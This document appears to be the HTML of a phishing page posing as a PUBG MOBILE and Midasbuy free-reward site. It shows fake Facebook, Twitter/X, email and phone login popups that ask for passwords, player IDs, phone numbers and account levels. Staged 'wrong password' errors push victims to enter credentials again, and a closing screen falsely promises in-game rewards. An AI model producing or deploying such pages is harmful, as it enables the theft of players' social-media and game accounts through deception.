<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE.</div> <!--- txt-login-fb --->
<div class="txt-login-alert">This doesn't let the app post to Facebook.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPassword()">Show</div> <!--- login-form-shid showPassword --->
<div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPassword()">Hide</div> <!--- login-form-shid hidePassword --->
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-footer">By continuing, PUBG MOBILE will receive ongoing access to the information that you share and Facebook will record when PUBG MOBILE accesses it. <a>Learn more</a> about this sharing and the settings that you have.</div> <!--- txt-footer --->
<div class="txt-footers">PUBG MOBILE's <a>Privacy Policy</a> and <a>Terms</a>
</div> <!--- txt-footer ---><br>
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onmousedown="tutup.play();" onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter"><img src="img/style-img/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="content-box-twitter">
<div class="txt-login-twitter">Log in to your X account to connect to PUBG MOBILE.</div> <!--- txt-login-twitter --->
<div class="content-box-twitter-txt">
<img src="img/style-img/icon_2.jpg">
<div class="content-box-twitter-txt-title">
PUBG MOBILE<br></div>
<div class="content-box-twitter-txt-det">
WINNER WINNER CHICKEN DINNER!
<br>
Official PUBG MOBILE Game!</div></div>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Phone, email, or username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi TwitterShowPassword" onclick="showTwitterPassword()">
<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
</div> <!--- form-group-sohi TwitterShowPassword --->
<div class="form-group-sohi TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()">
<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi TwitterHidePassword --->
<input type="password" name="password" id="password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<center><div class="alert-twitter-failed email-tw">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">Sorry, we couldn't find your account.</a></div>
<div class="alert-twitter-failed sandi-tw">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">Wrong Password!</a></div></center>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" href='#kinn-verify-on' class="onbutton" onclick="ValidateLoginTwitterData()">Log in</button>
</form>
<div class="content-box-twitter-txt-footer">
We recommend reviewing the app's terms and privacy policy to understand how it will use data from your Twitter account. You can revoke access to any app at any time from the <a>Apps and sessions</a> of your Twitter account settings.<br></div>
<div class="content-box-twitter-txt-footers">
By continuing, PUBG MOBILE will receive ongoing access to the information that you share and Twitter will record when PUBG MOBILE accesses it. <a>Learn more</a> about this sharing and the settings that you have. PUBG MOBILE's <a>Privacy Policy</a> and <a>Terms</a>.<br></div>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb"><img src="img/style-img/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="content-box-fb">
<div class="fb-load">
<img src="img/style-img/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login login-twitter-load" style="display: none;">
<div class="popup-box-login-twitter">
<div class="header-twitter"><img src="img/style-img/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="twitter-load">
<div class="twitter-load-title">
<div class="loader2" style="margin-top: 50px;"></div>
</div> <!--- twitter-load-title --->
</div> <!--- twitter-load --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook-sec animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb"><img src="img/style-img/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="navbar-alert-fb wrong-fb" style="display: block;text-align: center;"><b>The data you've entered is incorrect.</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div> <!--- navbar-alert --->
<div class="content-box-fb">
<img src="img/style-img/icon_2.jpg">
<div class="txt-login-fb">Log in to your PUBG MOBILE account to connect to Midasbuy using Facebook.</div> <!--- txt-login-fb --->
<div class="txt-login-alert">This doesn't let the app post to Facebook.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="SecValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="sec-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPasswordS()">Show</div> <!--- login-form-shid showPassword --->
<div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPasswordS()">Hide</div> <!--- login-form-shid hidePassword --->
<input type="password" name="password" id="sec-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="sec-login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="SecValidateLoginFbData()">Log In</button>
</form>
<div class="txt-footer">By continuing, Midasbuy will receive ongoing access to the information that you share and Facebook will record when Midasbuy accesses it. <a>Learn more</a> about this sharing and the settings that you have.</div> <!--- txt-footer --->
<div class="txt-footers">Midasbuy's <a>Privacy Policy</a> and <a>Terms</a>
</div> <!--- txt-footer ---><br>
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter-sec animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<div class="header-twitter"><img src="img/style-img/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="content-box-twitter">
<div class="txt-login-twitter">Log in to your PUBG MOBILE account to connect to Midasbuy using Twitter.</div> <!--- txt-login-twitter --->
<div class="content-box-twitter-txt">
<img src="img/style-img/icon_2.jpg">
<div class="content-box-twitter-txt-title">
PUBG MOBILE<br></div>
<div class="content-box-twitter-txt-det">
WINNER WINNER CHICKEN DINNER!
<br>
Official PUBG MOBILE Game!</div></div>
<form action="javascript:void(0)" method="post" id="SecValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="sec-email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>@Username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi TwitterShowPassword" onclick="showTwitterPasswordS()">
<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
</div> <!--- form-group-sohi TwitterShowPassword --->
<div class="form-group-sohi TwitterHidePassword" style="display: none;" onclick="hideTwitterPasswordS()">
<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi TwitterHidePassword --->
<input type="password" name="password" id="sec-password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<center>
<div class="alert-twitter-failed wrong-tw" style="display: block;">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">The data you've entered is incorrect.</a></div>
<div class="alert-twitter-failed email-tw">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">Sorry, we couldn't find your account.</a></div>
<div class="alert-twitter-failed sandi-tw">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">Wrong Password!</a></div></center>
<input type="hidden" name="login" id="sec-login-twitter" value="Twitter" readonly>
<button type="submit" href='#kinn-verify-on' class="seconbutton" onclick="SecValidateLoginTwitterData()">Log in</button>
</form>
<div class="content-box-twitter-txt-footer">
We recommend reviewing the app's terms and privacy policy to understand how it will use data from your Twitter account. You can revoke access to any app at any time from the <a>Apps and sessions</a> of your Twitter account settings.<br></div>
<div class="content-box-twitter-txt-footers">
By continuing, Midasbuy will receive ongoing access to the information that you share and Twitter will record when Midasbuy accesses it. <a>Learn more</a> about this sharing and the settings that you have. Midasbuy's <a>Privacy Policy</a> and <a>Terms</a>.<br></div>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Account Verification</div>
</div>
<div class="popup-box-bgz">
<div class="popup-box-alert4"><br>Complete your account details</div>
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="hidden" name="codetel" id="validateTel" readonly>
<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
for(var i = 1; i <= 100; i++){
document.write("<option>" + i + "</option>");
};
</script>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
<div class="popup-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verification</button>
</div>
</form>
</div>
</div>
</div>

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Account Verification</div>
</div>
<div class="popup-box-bgz" style="margin-top: 0px;">
<div class="popup-box-loading"><br><br><br>
<img class="animate-spin" src="img/style-img/loading.png"></img>
<br><br>Checking your account details...
<br>
</div>
<div class="popup-box-footer"></div>
</div>
</div>
</div>

<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Processing Account</div>
</div>
<div class="popup-box-bgz">
<div class="popup-box-alert2" style="line-height: 22px;"><br>
<p style="margin-top: -20px;">Hi Survivor,</p><br>
We are happy that you are still loyal to PUBG MOBILE.
<br>Your rewards is being processed, Rewards are sent to your <span style="color: #e67a07;">in-game mail inbox.</span>
<p>We will also notify you in the mailbox when we have successfully dispatched your rewards.
<br>Please wait up to 1-3 days.</p>
</div>
<br>
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div>
</div>
</div>
</div>
</div>

<div class="popup itemReward_confirmation animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login" style="background: none;">
<div class="popup-box-bg" style="height:230px;">
<div class="popup-box-alert4"><br> </div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine" style="width:75px; height:75px;margin-top:47px;">
<div>
<figure>
<img class="gift_img popup-item" src="">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
<div class="popup-box-footer" style="margin-top:40px;">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup open_rewards --->

<div class="popup namekexchange animated fadeIn" style="display: none;">
<div class="popup-box-wrapper popup-box-verification animated fadebawah">
<div class="popup-box-navbar">
<img onmousedown="tutup.play();" onclick="close_namekexchange()" src="img/close.png">
<div class="popup-box-navbarz" style="color:#ffffff;">
<div class="popup-box-navbar-title" style="text-align: left;margin-left: 8px;">Purchase Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bgz">
<div class="popup-box-alert-leftsnam" style="color: #fff;padding-top: 20px;">Gifts Details:</div>
<div class="popup-box-item-redeem2">
<div>
<figure>
<img class="redeemRewardsImg flip" src="img/sold.png" id="myItemReward_confirmationImgnam">
</figure>
</div>
</div> <!--- popup-box-item2low itemShine --->
<div class="popup-box-alert-enternam"></div>
<div class="popup-box-alert-redeemnam" style="font-size:15px; margin-top: -50px;padding-left:5px; line-height: 5px;"></div> <!--- popup-box-alert-redeem --->
<div class="popup-box-alert-leftsnam" style="font-size:16px;margin-top:-20px;color:#ffffff;font-family: laza;">: <span style="color: red;">Item Max Exchanged!</span></div><br><br>
<div class="popup-box-alert-pricenam" style="margin-bottom: 20px; line-height: 15px;font-family: laza;margin-left: 105px;">Try to redeem other items</div> <!--- popup-box-alert-redeem --->
<div class="popup-box-footer">
<button style="width: auto;margin-top: 10px;" type="submit" onmousedown="tutup.play();" onclick="close_namekexchange()">Close</button>
</div>
<div class="popup-box-alert-enter" style="padding-bottom:20px;"></div>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<div class="popup itemReward_confirmationnam animated fadeIn" style="display: none;">
<div class="popup-box-wrapper popup-box-verification animated fadebawah">
<div class="popup-box-navbarz" style="color:#ffffff;">
<img onmousedown="tutup.play();" onclick="close_itemReward_confirmationnam()" src="img/close.png">
<div class="popup-box-navbar-title" style="text-align: left;margin-left: 8px;">Purchase Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bgz">
<div class="popup-box-alert-leftsnam" style="color: #fff;padding-top: 20px;">Gifts Details :</div>
<div class="popup-box-item-redeemnam">
<div>
<figure>
<img class="redeemRewardsImg flip" src="" id="myItemReward_confirmationImg">
<div class="item-nominalnam"><span id="amount"></span></div>
</figure>
</div>
</div> <!--- popup-box-item2low itemShine --->
<div class="popup-box-alert-enternam"></div>
<div class="popup-box-alert-redeemnam" style="font-size:15px; margin-top: -20px; line-height: 5px;"><a id="rewardName"></a></div> <!--- popup-box-alert-redeem --->
<div class="popup-box-alert-enternam" style="border-bottom: 1px solid #383943;"></div>
<div class="popup-box-alert-leftsnam" style="color:#ffffff;">Price Details :</div>
<div class="popup-box-alert-pricenam" style="margin-bottom: 20px; line-height: 15px;">Item Price : <span id="price"></span> <img src="img/Token.png"></div> <!--- popup-box-alert-redeem --->
<div class="popup-box-alert-enternam" style="margin-top:-50px;border-bottom: 1px solid #383943;"></div>
<div class="popup-box-footer" style="margin-top:40px;">
<button style="width: auto;" type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_login()"">Redeem</button>
</div> </form>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->


<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="popup-box-navbar-login">
<div class="popup-box-navbar-login-title"></div> <!--- popup-box-navbar-login-title --->
</div> <!--- popup-box-navbar-login --->
<div class="popup-box-bg-login-load" id="load-login">
<div class="loader-line"></div>
<div class="loader-label" id="text-login1">Checking for updates...</div>
<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
</div> <!--- popup-box-bg-login --->
<div class="popup-box-bg-login" id="box-login">
<img src="https://www.pubgmobile.com/act/a20180515iggamepc/logo.png"></img>
<button type="button" class="popup-btn-login1 popup-btn-twitter1" onmousedown="buka.play();" onclick="open_twitter();"><i class="fa-brands fa-x-twitter" style="color: #000000;"></i>Twitter</button>
<button type="button" class="popup-btn-login1 popup-btn-facebook1" onmousedown="buka.play();" onclick="open_facebook();"><i class="fa-brands fa-square-facebook"></i>Facebook</button>
<button type="button" class="popup-btn-login1 popup-btn-login-link1" onmousedown="buka.play();" onclick="open_link();"><img class="icon-login" src="img/style-img/link.png"></img>Phone/Email</button>
<img style="width: 97%; height: auto; margin-bottom:10px; margin-top: 5px;" src="img/login.png">
</div> <!--- popup-box-bg-login --->
</div> <!--- popup-box --->
</div> <!--- popup account_login --->

<div class="popup account_loginx animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="popup-box-navbar-login">
<div class="popup-box-navbar-login-title"></div> <!--- popup-box-navbar-login-title --->
</div> <!--- popup-box-navbar-login --->
<div class="display-date" style="float:left;text-align:left;background-image: linear-gradient(to right, #000000 , #66000000);width:auto;">
<a >Version3.1.0.18553</a>
</div>	
<div class="popup-box-bg-login-load" id="load-login">
<div class="loader-line"></div>
<div class="loader-label" id="text-login1">Checking for updates...</div>
<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
</div> <!--- popup-box-bg-login --->
<div class="popup-box-bg-login" id="box-login">
<img src="https://www.pubgmobile.com/act/a20180515iggamepc/logo.png"></img>
<button type="button" class="popup-btn-login1 popup-btn-twitter1" onmousedown="buka.play();" onclick="open_twitter();"><i class="fa-brands fa-x-twitter" style="color: #000000;"></i>Twitter</button>
<button type="button" class="popup-btn-login1 popup-btn-facebook1" onmousedown="buka.play();" onclick="open_facebook();"><i class="fa-brands fa-square-facebook"></i>Facebook</button>
<img style="width: 97%; height: auto; margin-bottom:10px; margin-top: 5px;" src="img/login.png">
</div> <!--- popup-box-bg-login --->
</div> <!--- popup-box --->
</div> <!--- popup account_login --->

<div class="popup-link login-mail animated fadeIn" style="display: none;">
<div class="seclink-box">
<div class="seclink-box-navbar">
<img onmousedown="tutup.play();" onclick="close_link()" src="img/close.png">
<div class="seclink-box-navbar-title">
<a class="et">Email Login</a>
<a class="nt" style="display:none;">Mobile Number Login</a>
</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="seclink-box-bg">
<div class="seclink-box-alert"></div> <!--- popup-box-alert --->
<div class="seclink-wrapper">
<div class="seclink-content email-login" id="email-login" onmousedown="buka.play();" onclick="openloginlink(event, 'emaillog'); et();">
<div class="seclink-content-txt">Email address</div></div> <!--- seclink-content --->
<div class="seclink-content number-login" onmousedown="buka.play();" onclick="openloginlink(event, 'numberlog'); nt();">
<div class="seclink-content-txt">Mobile Number</div></div> <!--- seclink-content --->
</div> <!--- seclink-wrapper ---> <br>
<div class="form_login" id="emaillog">
<form action="javascript:void(0)" method="post" id="ValidateLoginMailForm">
<p class="kagetk email-k">Wrong e-mail. Please enter again.</p>
<p class="kagetk sandi-k">Wrong password. Try again.</p>
<label>E-mail address</label>
<input class="seclink-box-form-login" type="text" name="email" id="email-k" autoCapitalize='none' placeholder="Enter your e-mail" required oninvalid="this.setCustomValidity('Input your E-mail address')" oninput="setCustomValidity('')">
<label>Password</label>
<input class="seclink-box-form-login" type="password" name="password" id="password-k" placeholder="Please enter password" pattern="[a-zA-Z0-9]+" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
<center>
<input type="hidden" name="login" id="login-mail" value="Linked Email" readonly>
<div class="seclink-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateLoginMailData()">OK</button></center>
</form>
</div> <!--- email-login --->
<div class="form_login" id="numberlog">
<p class="kagetk email-nk">Wrong Phone number. Please enter again.</p>
<p class="kagetk sandi-nk">Wrong password. Try again.</p>
<label>Country/Region</label>
<form action="javascript:void(0)" method="post" id="ValidateLoginNumberForm">
<input class="seclink-box-form-region" type="tel" name="codetel" id="code-tel" readonly>    
<input class="seclink-box-form-number" type="number" name="email" id="email-nk" placeholder="Please enter Number Phone" required oninvalid="this.setCustomValidity('Input your Number Phone')" oninput="setCustomValidity('')"> 
<label>Password</label>
<input class="seclink-box-form-login" type="password" name="password" id="password-nk" placeholder="Please enter password" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
<input type="hidden" name="login" id="login-number" value="Linked Number" readonly>
<center><div class="seclink-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateLoginNumberData()">OK</button></center></form> <!--- form --->
</div> <!--- number-login --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup login-mail-load animated fadeIn" style="display: none;">
<div class="seclink-box">
<div class="seclink-box-navbar">
<div class="seclink-box-navbar-title">
<a>Email Login</a>
</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="seclink-box-bg">
<div class="seclink-box-alert"></div> <!--- popup-box-alert --->
<div class="seclink-wrapper">
<div class="seclink-content-active seclink-content">
<div class="seclink-content-txt">Email address</div></div> <!--- seclink-content --->
<div class="seclink-content">
<div class="seclink-content-txt">Mobile Number</div></div> <!--- seclink-content --->
</div> <!--- seclink-wrapper ---> <br>
<div id="load-ml" style="height:220px;">
<center>
<img class="load-login-img" style="margin-top:30px;" src="img/style-img/kotak.png"></img>
<br>
<img class="load-login-gif" src="img/style-img/load.gif"></img>
</center>
</div>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup login-mail-load --->

<div class="popup login-number-load animated fadeIn" style="display: none;">
<div class="seclink-box">
<div class="seclink-box-navbar">
<div class="seclink-box-navbar-title">
<a>Mobile Number Login</a>
</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="seclink-box-bg">
<div class="seclink-box-alert"></div> <!--- popup-box-alert --->
<div class="seclink-wrapper">
<div class="seclink-content">
<div class="seclink-content-txt">Email address</div></div> <!--- seclink-content --->
<div class="seclink-content-active seclink-content">
<div class="seclink-content-txt">Mobile Number</div></div> <!--- seclink-content --->
</div> <!--- seclink-wrapper ---> <br>
<div id="load-ml" style="height:220px;">
<center>
<img class="load-login-img" style="margin-top:30px;" src="img/style-img/kotak.png"></img>
<br>
<img class="load-login-gif" src="img/style-img/load.gif"></img>
</center>
</div>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup login-number-load --->

<audio id="audioItem" src="media/oyo.mp3"></audio>
<audio id="audioStop" src="media/stop.mp3"></audio>
<audio id="audioPopup" src="media/popup.mp3"></audio>
<script src="./index_files/jquery.min.js.download"></script>
<script type="text/javascript" src="index_files/gift-lenzz.js"></script>
<script src="js-zone/callcode-link.js"></script>
<script src="js-zone/code.js"></script>
<script src="js-zone/slidernotif.js"></script>
<script src="js-zone/sender.js"></script>
<script src="js-zone/slide-zone.js"></script>
<script src="js-zone/link.js"></script>
<script>
setTimeout(function () {
  $('.load-container').fadeOut(100);
  $('.slider-container').show();
}, 10);
</script>
<script>
	$(document).ready(function(){
    $('#password-twitter').keyup(function(){
        if($(this).val().length !=0){
            $('.onbutton').removeClass().addClass('twbutton'); 
        }
        else
        {
            $('.twbutton').removeClass().addClass('onbutton'); 
        }
    })
});
$(document).ready(function(){
    $('#sec-password-twitter').keyup(function(){
        if($(this).val().length !=0){
            $('.seconbutton').removeClass().addClass('sectwbutton'); 
        }
        else
        {
            $('.sectwbutton').removeClass().addClass('seconbutton'); 
        }
    })
});
        /***
         * code clarified by @sewatt
         * this file is protected by sewatt
         */
        // slider id
        var slideIndex = 0;
        showSlides();
        function showSlides() {
            var i;
            var slides = document.getElementsByClassName("slider");
            for (i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
            }
            slideIndex++;
            if (slideIndex > slides.length) {
                slideIndex = 1
            }
            slides[slideIndex - 1].style.display = "block";
            setTimeout(showSlides, 2500);
        }
        // slider gambar header
        var sliderHeader = 0;
openSlides();
function openSlides() {
    var i;
    var slides = document.getElementsByClassName("header-img");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    sliderHeader++;
    if (sliderHeader > slides.length) {sliderHeader = 1} 
    slides[sliderHeader-1].style.display = "block"; 
    setTimeout(openSlides, 2500);
}
    </script>
<script>
function close_itemReward_confirmationnam() {
    $('.itemReward_confirmationnam').hide();
}
function open_itemReward_confirmationnam(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    var rewardName = $(ag).attr("data-name");
    var amount = $(ag).attr("data-id");
    var price = $(ag).attr("value");
    $('.itemReward_confirmationnam').show();   
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
    $('#rewardName').html(rewardName);
    $('#amount').html(amount);
    $('#price').html(price);
}
function close_namekexchange() {
    $('.namekexchange').hide();
    $('.namekspin').hide();       
}
function open_namekexchange(ag) {
    var namekexchange = $(ag).attr("src");
    $('.namekexchange').show();   
    $('.namekspin').hide();      
}  
</script>
<script>
// code funtion timers
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script><script>
setTimeout(function () {
  $('.loadkin').fadeOut(750);
}, 2000);
</script>
<script>(function(){var js = "window['__CF$cv$params']={r:'836ec256dac64011',t:'MTcwMjgxMTg0MS42MDAwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script>
</body>
</html>
